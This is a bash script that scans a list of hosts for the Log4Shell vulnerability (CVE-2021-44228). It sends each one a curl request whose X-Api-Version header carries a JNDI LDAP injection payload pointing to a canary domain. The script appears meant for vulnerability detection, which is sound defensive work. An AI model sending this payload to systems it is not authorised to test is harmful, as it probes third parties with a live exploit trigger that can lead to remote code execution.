#!/bin/bash
# Author: Steve Stonebraker
# Date: 2021-12-10
# Usage: ./log4j_CVE-2021-44228_tester.sh <INPUT_FILE> <CANARY_DOMAIN>
# Purpose: 
# This script will iterate through a list of IP Addresses/Domain Names and call
# each one using curl and send a payload that will notify a DNS canary domain 
# (if the site is vulnerable to log4shell aka CVE-2021-44228)
INPUTFILE=$1
INPUTFILE_LENGTH=$(wc -l < ${INPUTFILE} | bc)
CANARY_DOMAIN=$2
USERAGENT="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36"
PAYLOAD="X-Api-Version: \${jndi:ldap://${CANARY_DOMAIN}/a}"
COUNT=0
for record in $(cat "${INPUTFILE}")
do
        COUNT=$((COUNT+1))
        URL="http://${record}:8080/"
        response=$(curl --silent -L -o /dev/null --connect-timeout 3 -k -w "%{http_code}" -I "$URL" -A "${USERAGENT}" -H "${PAYLOAD}")
        echo "[*] Record ${COUNT} of ${INPUTFILE_LENGTH} - [${record}] - [Response: ${response}]"
        echo "-----------------------"
done
